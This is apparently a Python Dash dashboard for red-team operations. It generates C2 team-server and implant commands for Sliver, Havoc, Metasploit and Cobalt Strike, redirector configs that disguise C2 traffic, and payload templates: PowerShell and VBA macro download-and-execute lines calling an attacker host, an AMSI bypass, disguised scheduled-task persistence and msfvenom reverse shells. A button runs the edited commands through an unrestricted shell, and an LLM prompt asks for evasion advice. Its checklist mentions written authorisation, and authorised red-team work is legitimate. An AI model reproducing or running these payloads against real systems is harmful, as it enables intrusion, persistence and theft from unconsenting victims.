"""
ui_red_team_ops.py
Red Team Infrastructure & Operations
C2 Framework Manager · Campaign Tracker · Redirector Setup ·
Payload Generation · Cobalt Strike / Sliver / Havoc / Metasploit ·
OPSEC Checklist · AI Attack Narrative
"""
from __future__ import annotations

import subprocess
import threading
import time
from datetime import datetime

from dash import callback, dcc, html, Input, Output, State, ctx
from dash.exceptions import PreventUpdate
import dash_bootstrap_components as dbc

try:
    from llm_engine import call_llm
except ImportError:
    def call_llm(prompt: str) -> str:
        return "LLM engine not available."

DARK_BG   = "#0d0d0d"
CARD_BG   = "#111317"
BORDER    = "1px solid #1e2230"
INPUT_STY = {"background": "#1a1d24", "border": BORDER, "color": "#e0e0e0",
             "borderRadius": "6px", "fontSize": "13px"}
BTN_SM    = {"borderRadius": "6px", "fontSize": "12px", "padding": "4px 10px"}
LABEL     = {"color": "#8e9eb0", "fontSize": "11px", "marginBottom": "4px",
             "fontWeight": "600", "textTransform": "uppercase", "letterSpacing": "0.5px"}
MONO      = {"fontFamily": "monospace", "fontSize": "11px"}

_OUTPUTS: dict[str, str] = {}
_LOCK     = threading.Lock()

# Campaign tracker
_CAMPAIGNS: list[dict] = []


def _card(*children, style=None):
    base = {"background": CARD_BG, "border": BORDER, "borderRadius": "10px",
            "padding": "16px", "marginBottom": "12px"}
    if style:
        base.update(style)
    return html.Div(children, style=base)

def _label(t): return html.Div(t, style=LABEL)
def _cmd(c):   return html.Div(c, style={**MONO, "color": "#50fa7b",
                                          "background": "#0d0d0d",
                                          "padding": "3px 8px",
                                          "borderRadius": "4px",
                                          "marginBottom": "3px"})

def _run_bg(cmd: str, key: str):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=60)
        out = r.stdout + ("\n[STDERR]\n" + r.stderr if r.stderr else "")
    except subprocess.TimeoutExpired:
        out = "[TIMEOUT]"
    except Exception as e:
        out = f"[ERROR] {e}"
    with _LOCK:
        _OUTPUTS[key] = out


def _c2_cmd(framework: str, team_server: str) -> str:
    ts = team_server or "YOUR_TEAM_SERVER_IP"
    if framework == "sliver":
        return f"""# ── Sliver C2 Framework ──────────────────────────────────
# Install: curl https://sliver.sh/install | sudo bash

# Start Sliver server
sliver-server

# Multiplayer mode (operators)
sliver-server operator --name op1 --lhost {ts} --save op1.cfg

# In Sliver console:
# Generate HTTPS implant
generate --mtls {ts} --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Generate shellcode
generate --mtls {ts} --os windows --format shellcode --save /tmp/sc.bin

# Start listener
mtls --lport 443

# List sessions
sessions

# Interact with session
use SESSION_ID

# Execute commands
execute -t 60 whoami
execute -t 60 ipconfig
ls C:\\\\

# Pivoting
socks5 start --port 1080

# Generate stager
stage-listener --url http://{ts}:80/s --profile PROFILE"""

    elif framework == "havoc":
        return f"""# ── Havoc C2 Framework ───────────────────────────────────
# Install: https://github.com/HavocFramework/Havoc
# git clone https://github.com/HavocFramework/Havoc
# cd Havoc && make

# Start Havoc teamserver
./teamserver server --profile ./profiles/havoc.yaotl

# Connect Havoc client
# ./havoc client

# Profile example (havoc.yaotl):
# Teamserver {{
#     Host = "{ts}"
#     Port = 40056
#     Build = {{ Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc" }}
# }}

# Listeners (in Havoc UI):
# - HTTPS listener on port 443
# - SMB listener for lateral movement

# Demon agent features:
# - Process injection
# - Token manipulation
# - Kerberos operations
# - BOF (Beacon Object Files) support
# - PatchGuard bypass"""

    elif framework == "metasploit":
        return f"""# ── Metasploit Framework ─────────────────────────────────
# Start msfconsole
msfconsole -q

# Start handler
handler -H 0.0.0.0 -P 4444 -p windows/x64/meterpreter/reverse_https

# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ts} LPORT=443 \\
  -f exe -o /tmp/payload.exe

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ts} LPORT=443 \\
  -f psh-reflection -o /tmp/payload.ps1

# Meterpreter post-exploitation
# getsystem          # Priv esc
# hashdump           # Dump NTLM hashes
# run post/multi/recon/local_exploit_suggester
# run post/windows/gather/credentials/credential_collector
# portfwd add -l 3389 -p 3389 -r 192.168.1.10

# Pivoting
# route add 192.168.2.0/24 SESSION_ID
# use auxiliary/server/socks_proxy
# set SRVPORT 1080
# run"""

    else:  # cobalt strike (commercial)
        return f"""# ── Cobalt Strike (Commercial) ───────────────────────────
# Requires valid licence from HelpSystems

# Start teamserver
./teamserver {ts} PASSWORD malleable_profile.c2

# Malleable C2 Profile (office365.c2):
# set sleeptime "60000";
# set jitter "20";
# http-get {{
#   set uri "/o365/auth";
#   client {{ header "Accept" "application/json"; }}
#   server {{ header "Content-Type" "application/json"; }}
# }}

# Generate beacon (in CS client)
# Attacks → Packages → Windows Executable
# Listener: HTTPS reverse shell

# Aggressor script for automation
# agscript teamserver PORT user pass script.cna

# BOF (Beacon Object Files)
# beacon> inline-execute /path/to/bof.o args

# Kerberos attacks
# beacon> kerberoast
# beacon> asreproast"""


def _redirector_cmd(redir_ip: str, ts_ip: str) -> str:
    r = redir_ip or "REDIRECTOR_IP"
    t = ts_ip or "TEAM_SERVER_IP"
    return f"""# ── Redirector / Traffic Routing Setup ───────────────────
# Architecture: Target → Redirector → C2 Team Server

# Option 1: Apache mod_rewrite redirector
# /etc/apache2/sites-enabled/000-default.conf
# <VirtualHost *:443>
#   SSLEngine on
#   RewriteEngine on
#   # Only forward known C2 URIs
#   RewriteRule "^/beacon$" "https://{t}/beacon" [P]
#   RewriteRule "^/submit.php$" "https://{t}/submit.php" [P]
#   # Redirect everything else to legitimate site
#   RewriteRule "^" "https://microsoft.com/" [R=302,L]
# </VirtualHost>

# Option 2: NGINX redirector
cat > /etc/nginx/sites-enabled/redirector.conf << 'EOF'
server {{
    listen 443 ssl;
    ssl_certificate /etc/letsencrypt/live/{r}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{r}/privkey.pem;

    location /beacon {{
        proxy_pass https://{t}/beacon;
        proxy_ssl_verify off;
    }}
    location / {{
        return 302 https://microsoft.com;
    }}
}}
EOF
nginx -t && systemctl reload nginx

# Option 3: socat simple redirect
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:{t}:443 &

# Option 4: iptables NAT
iptables -t nat -A PREROUTING -p tcp --dport 443 \\
  -j DNAT --to-destination {t}:443
iptables -t nat -A POSTROUTING -j MASQUERADE

# Option 5: Cloudflare as redirector (Domain Fronting)
# - Add CNAME for your domain pointing to C2 team server
# - Configure CF to proxy traffic (orange cloud)
# - CF hides real C2 IP

# HTTPS cert via Let's Encrypt
certbot certonly --standalone -d {r}"""


def _payload_cmd(os_target: str, method: str, lhost: str) -> str:
    lh = lhost or "YOUR_LHOST"
    if method == "powershell":
        return f"""# ── PowerShell Payload Techniques ────────────────────────
# Download & Execute (AMSI bypass required)
powershell -exec bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{lh}/payload.ps1')"

# Encoded command
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://{lh}/p.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc = [Convert]::ToBase64String($bytes)
powershell -enc $enc

# AMSI bypass (common bypass, EDR may detect)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Fileless via WMI
wmic process call create "powershell -enc <ENCODED>"

# Fileless via Scheduled Task
schtasks /create /tn "WindowsUpdate" /tr "powershell -enc <ENC>" /sc minute /mo 5 /f"""
    elif method == "macro":
        return f"""# ── Office Macro / VBA Payload ──────────────────────────
' VBA macro to download and execute
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -exec bypass -nop -w hidden -c " & _
        "IEX((New-Object Net.WebClient).DownloadString('http://{lh}/p.ps1'))", 0, False
End Sub

' Alternative: certutil lolbin
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "certutil -urlcache -f http://{lh}/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe", 0
End Sub

# Generate with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lh} LPORT=443 \\
  -f vba -o payload.vba

# EvilClippy (obfuscate VBA)
# python3 EvilClippy.py -s payload.vba template.docx"""
    else:  # dll/shellcode
        return f"""# ── DLL / Shellcode Delivery ─────────────────────────────
# Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST={lh} LPORT=443 \\
  -f raw -o /tmp/shellcode.bin

# DLL Sideloading (hijack legitimate DLL loads)
# 1. Find vulnerable application
procmon.exe → filter RESULT=NAME_NOT_FOUND AND PATH ends with .dll

# 2. Compile malicious DLL
gcc -shared -o malicious.dll payload.c -lws2_32

# Sliver shellcode loader
# generate --mtls {lh} --format shellcode -s /tmp/sc.bin

# donut (shellcode generator)
# donut -f pe -i implant.exe -o sc.bin -a 2
# donut generates shellcode from any PE/DLL

# Inject shellcode (C code skeleton)
# CreateRemoteThread / NtCreateThreadEx / APC injection
# QueueUserAPC() for stealth

# DLL Injection via PowerShell
# Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId (Get-Process notepad).Id"""


def layout() -> html.Div:
    return html.Div([
        dcc.Store(id="rt-campaigns", data=[]),

        html.Div([
            html.H4("🔴 Red Team Infrastructure & Operations",
                    style={"color": "#e0e0e0", "fontWeight": "700", "margin": "0"}),
            html.Div("C2 Framework (Sliver/Havoc/Cobalt Strike/Metasploit) · "
                     "Redirectors · Payload Builder · Campaign Tracker · AI Narrative",
                     style={"color": "#636e72", "fontSize": "13px"}),
        ], style={"marginBottom": "16px"}),

        dbc.Row([
            # ── Left ────────────────────────────────────────────────────────
            dbc.Col([
                _card(
                    html.Div("🎮 Op Configuration",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "12px"}),
                    _label("C2 Framework"),
                    dbc.Select(id="rt-framework",
                               options=[
                                   {"label": "Sliver (OSS)",        "value": "sliver"},
                                   {"label": "Havoc (OSS)",          "value": "havoc"},
                                   {"label": "Metasploit (OSS)",     "value": "metasploit"},
                                   {"label": "Cobalt Strike (Comm)", "value": "cobalt"},
                               ], value="sliver",
                               style={**INPUT_STY, "marginBottom": "8px"}),
                    _label("Team Server IP"),
                    dbc.Input(id="rt-ts-ip", placeholder="YOUR_TEAM_SERVER_IP",
                              style={**INPUT_STY, "marginBottom": "8px"}),
                    _label("Redirector IP"),
                    dbc.Input(id="rt-redir-ip", placeholder="REDIRECTOR_IP",
                              style={**INPUT_STY, "marginBottom": "8px"}),
                    _label("LHOST (payload)"),
                    dbc.Input(id="rt-lhost", placeholder="10.10.10.10",
                              style={**INPUT_STY, "marginBottom": "8px"}),
                    dbc.Button("🔄 Update Commands", id="rt-update-btn",
                               color="primary", size="sm",
                               style={**BTN_SM, "width": "100%",
                                      "marginBottom": "4px"}),
                    html.Div(id="rt-update-status",
                             style={"color": "#636e72", "fontSize": "11px",
                                    "minHeight": "14px"}),
                ),
                _card(
                    html.Div("🤖 AI Red Team", style={"color": "#e0e0e0",
                                                        "fontWeight": "600",
                                                        "marginBottom": "10px"}),
                    dbc.Button("📖 Attack Narrative", id="rt-ai-narrative",
                               color="outline-danger", size="sm",
                               style={**BTN_SM, "width": "100%",
                                      "marginBottom": "6px"}),
                    dbc.Button("🛡️ OPSEC Review", id="rt-ai-opsec",
                               color="outline-info", size="sm",
                               style={**BTN_SM, "width": "100%",
                                      "marginBottom": "6px"}),
                    dbc.Button("📋 Rules of Engagement", id="rt-ai-roe",
                               color="outline-warning", size="sm",
                               style={**BTN_SM, "width": "100%",
                                      "marginBottom": "8px"}),
                    html.Div(id="rt-ai-out",
                             style={"color": "#b0b0b0", "fontSize": "12px",
                                    "whiteSpace": "pre-wrap",
                                    "maxHeight": "260px", "overflowY": "auto"}),
                ),
            ], width=3),

            # ── Centre ───────────────────────────────────────────────────────
            dbc.Col([
                dbc.Tabs(id="rt-tabs", active_tab="rt-tab-c2",
                         style={"marginBottom": "12px"},
                         children=[
                     dbc.Tab(label="🖥️ C2 Setup",      tab_id="rt-tab-c2"),
                     dbc.Tab(label="🔀 Redirectors",    tab_id="rt-tab-redir"),
                     dbc.Tab(label="💀 Payloads",       tab_id="rt-tab-payload"),
                     dbc.Tab(label="📋 Campaigns",      tab_id="rt-tab-campaign"),
                 ]),
                html.Div(id="rt-phase-content"),
            ], width=6),

            # ── Right ────────────────────────────────────────────────────────
            dbc.Col([
                _card(
                    html.Div("🛡️ OPSEC Checklist",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    *[html.Div([
                        html.Span("□ ", style={"color": "#636e72"}),
                        html.Span(item, style={"color": "#b0b0b0",
                                               "fontSize": "11px"}),
                      ], style={"marginBottom": "4px"})
                      for item in [
                          "Written authorisation signed",
                          "Target scope defined in RoE",
                          "Emergency stop procedure agreed",
                          "C2 infrastructure categorised",
                          "Redirectors in place (no direct C2)",
                          "Malleable C2 profile configured",
                          "Domain categorised (not suspicious)",
                          "Burner VPS/infra separate from personal",
                          "No real name in WHOIS",
                          "Logging of all operator actions",
                          "Exfil data encrypted + minimised",
                          "Clean up artefacts on completion",
                          "Debriefing report delivered",
                      ]],
                ),
                _card(
                    html.Div("📋 Quick Reference",
                             style={"color": "#e0e0e0", "fontWeight": "600",
                                    "marginBottom": "10px"}),
                    *[_cmd(c) for c in [
                        "sliver-server",
                        "generate --mtls <IP> --os windows",
                        "mtls --lport 443",
                        "sessions",
                        "msfconsole -q",
                        "msfvenom -p win/x64/meterpreter/reverse_https",
                        "certbot certonly -d domain.com",
                        "socat TCP4-LISTEN:443,fork TCP4:TS_IP:443",
                    ]],
                ),
            ], width=3),
        ]),
    ], style={"background": DARK_BG, "minHeight": "100vh", "padding": "24px"})


@callback(
    Output("rt-phase-content", "children"),
    Output("rt-update-status", "children"),
    Input("rt-tabs",            "active_tab"),
    Input("rt-update-btn",      "n_clicks"),
    State("rt-framework",       "value"),
    State("rt-ts-ip",           "value"),
    State("rt-redir-ip",        "value"),
    State("rt-lhost",           "value"),
)
def render_phase(tab, upd_n, fw, ts_ip, redir_ip, lhost):
    status = f"✅ Updated {datetime.now().strftime('%H:%M:%S')}" if upd_n else ""
    fw     = fw      or "sliver"
    ts     = ts_ip   or "YOUR_TEAM_SERVER_IP"
    rd     = redir_ip or "REDIRECTOR_IP"
    lh     = lhost   or "YOUR_LHOST"

    def _tab_card(title: str, cmd: str, phase_id: str) -> html.Div:
        return _card(
            html.Div(title, style={"color": "#e0e0e0", "fontWeight": "600",
                                   "marginBottom": "10px"}),
            _label("Command"),
            dbc.Textarea(id=f"rt-{phase_id}-cmd", value=cmd,
                         style={**INPUT_STY, "height": "280px",
                                "fontFamily": "monospace", "fontSize": "11px",
                                "marginBottom": "8px"}),
            dbc.Row([
                dbc.Col(dbc.Button("▶ Run", id=f"rt-{phase_id}-run",
                                   color="danger", size="sm",
                                   style={**BTN_SM, "width": "100%"}), width=4),
            ], style={"marginBottom": "8px"}),
            dbc.Textarea(id=f"rt-{phase_id}-out", value="", readOnly=True,
                         style={**INPUT_STY, "height": "180px",
                                "fontFamily": "monospace", "fontSize": "11px",
                                "color": "#50fa7b"}),
        )

    if tab == "rt-tab-c2":
        return _tab_card(f"🖥️ {fw.title()} C2 Setup", _c2_cmd(fw, ts), "c2"), status
    elif tab == "rt-tab-redir":
        return _tab_card("🔀 Redirector Configuration", _redirector_cmd(rd, ts), "redir"), status
    elif tab == "rt-tab-payload":
        return _card(
            html.Div("💀 Payload Builder", style={"color": "#e0e0e0",
                                                   "fontWeight": "600",
                                                   "marginBottom": "10px"}),
            _label("Delivery Method"),
            dbc.Select(id="rt-payload-method",
                       options=[
                           {"label": "PowerShell",    "value": "powershell"},
                           {"label": "Office Macro",  "value": "macro"},
                           {"label": "DLL/Shellcode", "value": "dll"},
                       ], value="powershell",
                       style={**INPUT_STY, "marginBottom": "8px"}),
            _label("Command"),
            dbc.Textarea(id="rt-payload-cmd",
                         value=_payload_cmd("windows", "powershell", lh),
                         style={**INPUT_STY, "height": "280px",
                                "fontFamily": "monospace", "fontSize": "11px",
                                "marginBottom": "8px"}),
            dbc.Row([
                dbc.Col(dbc.Button("▶ Run", id="rt-payload-run",
                                   color="danger", size="sm",
                                   style={**BTN_SM, "width": "100%"}), width=4),
            ], style={"marginBottom": "8px"}),
            dbc.Textarea(id="rt-payload-out", value="", readOnly=True,
                         style={**INPUT_STY, "height": "150px",
                                "fontFamily": "monospace", "fontSize": "11px",
                                "color": "#50fa7b"}),
        ), status
    elif tab == "rt-tab-campaign":
        return _card(
            html.Div("📋 Red Team Campaign Tracker",
                     style={"color": "#e0e0e0", "fontWeight": "600",
                            "marginBottom": "10px"}),
            dbc.Row([
                dbc.Col([
                    _label("Campaign Name"),
                    dbc.Input(id="rt-camp-name", placeholder="Op Phantom 2025",
                              style={**INPUT_STY, "marginBottom": "8px"}),
                    _label("Client"),
                    dbc.Input(id="rt-camp-client", placeholder="Acme Corp",
                              style={**INPUT_STY, "marginBottom": "8px"}),
                ], width=6),
                dbc.Col([
                    _label("Phase"),
                    dbc.Select(id="rt-camp-phase",
                               options=[
                                   {"label": "Recon",              "value": "recon"},
                                   {"label": "Initial Access",     "value": "initial"},
                                   {"label": "Establishment",      "value": "establish"},
                                   {"label": "Lateral Movement",   "value": "lateral"},
                                   {"label": "Objective",          "value": "objective"},
                                   {"label": "Exfiltration",       "value": "exfil"},
                                   {"label": "Reporting",          "value": "report"},
                               ], value="recon",
                               style={**INPUT_STY, "marginBottom": "8px"}),
                    _label("Status"),
                    dbc.Select(id="rt-camp-status",
                               options=[
                                   {"label": "🟡 Planning",   "value": "planning"},
                                   {"label": "🟠 Active",     "value": "active"},
                                   {"label": "🔴 Paused",     "value": "paused"},
                                   {"label": "✅ Complete",   "value": "complete"},
                               ], value="planning",
                               style={**INPUT_STY, "marginBottom": "8px"}),
                ], width=6),
            ]),
            dbc.Button("➕ Add Campaign", id="rt-camp-add",
                       color="outline-success", size="sm",
                       style={**BTN_SM, "marginBottom": "8px"}),
            html.Div(id="rt-camp-list",
                     style={"maxHeight": "280px", "overflowY": "auto",
                            "marginTop": "6px"}),
        ), status

    return html.Div(), status


# Run callbacks
def _make_run_cb(phase_id: str):
    @callback(
        Output(f"rt-{phase_id}-out", "value"),
        Input(f"rt-{phase_id}-run",  "n_clicks"),
        State(f"rt-{phase_id}-cmd",  "value"),
        prevent_initial_call=True,
    )
    def run_cb(n, cmd, _pid=phase_id):
        if not n or not cmd:
            raise PreventUpdate
        threading.Thread(target=_run_bg, args=(cmd, _pid), daemon=True).start()
        time.sleep(5)
        with _LOCK:
            return _OUTPUTS.get(_pid, "[Running…]")
    run_cb.__name__ = f"rt_run_{phase_id}"

for _pid in ["c2", "redir", "payload"]:
    _make_run_cb(_pid)


@callback(
    Output("rt-payload-cmd", "value"),
    Input("rt-payload-method", "n_clicks"),
    State("rt-payload-method", "value"),
    State("rt-lhost",          "value"),
    prevent_initial_call=True,
)
def update_payload_cmd(n, method, lhost):
    if not n:
        raise PreventUpdate
    return _payload_cmd("windows", method or "powershell", lhost or "LHOST")


@callback(
    Output("rt-camp-list",  "children"),
    Input("rt-camp-add",    "n_clicks"),
    State("rt-camp-name",   "value"),
    State("rt-camp-client", "value"),
    State("rt-camp-phase",  "value"),
    State("rt-camp-status", "value"),
    State("rt-campaigns",   "data"),
    prevent_initial_call=True,
)
def add_campaign(n, name, client, phase, status, campaigns):
    if not n or not name:
        raise PreventUpdate
    campaigns = campaigns or []
    camp = {"name": name, "client": client or "—",
            "phase": phase, "status": status,
            "date":  datetime.now().strftime("%Y-%m-%d")}
    campaigns.append(camp)
    with _LOCK:
        _CAMPAIGNS.append(camp)
    status_colors = {"planning": "#f1c40f", "active": "#e67e22",
                     "paused": "#c0392b",   "complete": "#27ae60"}
    rows = []
    for c in campaigns:
        sc = status_colors.get(c.get("status", "planning"), "#636e72")
        rows.append(html.Div([
            html.Span(c["name"], style={"color": "#e0e0e0", "fontWeight": "700",
                                         "fontSize": "12px", "marginRight": "8px"}),
            html.Span(c["client"], style={"color": "#8e9eb0", "fontSize": "11px",
                                           "marginRight": "8px"}),
            html.Span(c["phase"].upper(), style={"color": "#3498db",
                                                   "fontSize": "10px",
                                                   "marginRight": "6px"}),
            html.Span(f"● {c['status']}", style={"color": sc,
                                                   "fontSize": "10px",
                                                   "fontWeight": "700"}),
        ], style={"padding": "6px", "borderBottom": f"1px solid {DARK_BG}"}))
    return html.Div(rows)


@callback(
    Output("rt-ai-out",       "children"),
    Input("rt-ai-narrative",  "n_clicks"),
    Input("rt-ai-opsec",      "n_clicks"),
    Input("rt-ai-roe",        "n_clicks"),
    State("rt-framework",     "value"),
    State("rt-ts-ip",         "value"),
    prevent_initial_call=True,
)
def ai_redteam(narr_n, opsec_n, roe_n, fw, ts):
    if not ctx.triggered_id:
        raise PreventUpdate
    tid  = ctx.triggered_id
    fw   = fw or "Sliver"
    with _LOCK:
        results = "\n".join(f"[{k}]\n{v[:300]}" for k, v in _OUTPUTS.items())
    if tid == "rt-ai-narrative":
        prompt = (
            f"You are a red team operator. Write an attack narrative for a red team "
            f"engagement using {fw} C2 framework.\n\n"
            f"Operation results so far:\n{results or 'None'}\n\n"
            f"Write:\n"
            f"1) **Attack Narrative** — story of the campaign like an APT report\n"
            f"2) **MITRE ATT&CK Mapping** — each action mapped to techniques\n"
            f"3) **Key Findings** — what was compromised and how\n"
            f"4) **Impact Assessment** — what the attacker achieved\n"
            f"5) **Detection Opportunities** — where defenders could have caught us"
        )
    elif tid == "rt-ai-opsec":
        prompt = (
            f"Red team OPSEC review for {fw} C2 engagement:\n\n"
            f"Provide:\n"
            f"1) **OPSEC Failures** — common mistakes that get red teams caught\n"
            f"2) **C2 Fingerprinting** — how {fw} can be identified by defenders\n"
            f"3) **Traffic Analysis** — what does {fw} look like on the wire?\n"
            f"4) **Evasion Improvements** — how to improve stealth\n"
            f"5) **Blue Team Detections** — Sigma rules that would catch this op"
        )
    else:  # rules of engagement
        prompt = (
            f"Generate a professional Rules of Engagement (RoE) document template "
            f"for a red team engagement.\n\n"
            f"Include:\n"
            f"1) **Scope Definition** — in-scope/out-of-scope assets\n"
            f"2) **Authorised Techniques** — what is explicitly permitted\n"
            f"3) **Prohibited Activities** — absolute restrictions\n"
            f"4) **Emergency Contacts** — escalation procedures\n"
            f"5) **Evidence Handling** — data retention and destruction\n"
            f"6) **Timeline** — engagement window and reporting deadlines\n\n"
            f"Format as a professional legal document template."
        )
    try:
        return call_llm(prompt)
    except Exception as e:
        return f"LLM error: {e}"
